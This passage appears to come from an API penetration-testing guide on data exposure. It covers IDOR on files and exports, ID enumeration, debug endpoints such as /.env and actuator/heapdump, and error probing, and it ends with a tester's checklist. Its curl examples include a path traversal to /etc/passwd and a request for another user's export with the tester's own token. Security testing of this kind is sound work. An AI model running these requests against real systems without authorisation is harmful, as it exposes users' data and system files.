          number  # Might be exposed!
          cvv
          expiry
        }
      }
    }
  }
}
```

## Metadata Exposure

### Object IDs
```bash
# Sequential IDs leak user count
/api/users/1
/api/users/2
/api/users/12345  # ~12,345 users

# UUIDs in responses might be reusable
{
  "user_id": "550e8400-e29b-41d4-a716-446655440000",
  "order_id": "550e8400-e29b-41d4-a716-446655440001"
}
```

### Timestamps
```json
{
  "created_at": "2024-01-15T10:30:00Z",
  "updated_at": "2024-01-15T10:30:00Z",
  "last_login": "2024-01-15T10:30:00Z",
  "password_changed_at": "2023-06-01T00:00:00Z"
}
// Reveals activity patterns
```

### Internal References
```json
{
  "id": 123,
  "internal_user_id": "USR_INT_456",  // Internal system ID
  "database_shard": "shard_03",       // Infrastructure info
  "processing_node": "worker-05"      // Architecture info
}
```

## File and Document Exposure

### Direct File Access
```bash
# Try common file endpoints
/api/files/{id}
/api/documents/{id}
/api/attachments/{uuid}
/api/export/{id}

# Test IDOR on files
curl https://target.com/api/files/1
curl https://target.com/api/files/2
curl https://target.com/api/files/100
```

### Presigned URL Enumeration
```bash
# If using cloud storage presigned URLs
# Check if URLs are predictable
https://storage.cloud.com/bucket/file1.pdf?signature=abc
https://storage.cloud.com/bucket/file2.pdf?signature=def
# Can you access file2 with file1's pattern?
```

## Environment Information Disclosure

### Server Headers
```bash
curl -I https://target.com/api/health

# Sensitive headers:
# Server: Apache/2.4.41 (Ubuntu)
# X-Powered-By: PHP/7.4.3
# X-AspNet-Version: 4.0.30319
```

### Debug Endpoints
```bash
# Common debug/info endpoints
/api/debug
/api/health
/api/info
/api/version
/api/status
/api/metrics
/api/env
/api/.env
/api/config
/api/phpinfo
/api/actuator
/api/actuator/env
/api/actuator/heapdump
```

### Error Response Analysis
```bash
# Intentionally cause errors
curl https://target.com/api/test -X INVALID_METHOD
curl https://target.com/api/%00
curl https://target.com/api/../../etc/passwd
# Analyze error messages for info
```

## Export Functionality Abuse

### Large Data Exports
```bash
# Try to export more than intended
curl https://target.com/api/export \
  -d '{"start": "2000-01-01", "end": "2030-01-01"}' \
  -H "Authorization: Bearer $TOKEN"

# Export all records
curl https://target.com/api/export?limit=999999999
```

### Export Other Users' Data
```bash
# IDOR in export
curl https://target.com/api/users/OTHER_ID/export \
  -H "Authorization: Bearer MY_TOKEN"
```

## Data Exposure Checklist

- [ ] Excessive fields in responses?
- [ ] Debug mode enabled?
- [ ] Verbose error messages?
- [ ] Stack traces exposed?
- [ ] Sequential IDs predictable?
- [ ] Timestamps reveal info?
- [ ] Internal references exposed?
- [ ] File access properly controlled?
- [ ] Presigned URLs secure?
- [ ] Debug endpoints accessible?
- [ ] Export functions limited?